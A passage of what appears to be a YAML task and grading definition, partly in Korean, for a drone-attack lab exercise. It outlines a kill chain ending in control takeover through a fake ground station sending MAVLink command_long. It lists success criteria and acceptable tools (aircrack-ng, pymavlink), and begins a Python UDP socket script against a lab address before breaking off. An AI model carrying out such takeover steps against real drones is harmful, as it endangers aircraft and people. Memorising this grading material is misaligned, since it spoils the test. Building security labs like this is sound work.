        → 연결(가짜 GCS) → 제어 탈취(MAVLink command_long). 전체 Kill Chain 실증
      success_criteria:
      - 5단계 순서 모두
      - 각 단계 도구·명령 언급
      acceptable_methods:
      - aircrack-ng + pymavlink
      - 실제 드론 시뮬레이터
      negative_signs:
      - 단계 3개 이하
      - 도구 언급 없음
  target_vm: attacker
  script: 'python3 -c "import socket,json;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(2);target=(''10.20.30.200'',9999);print(''===
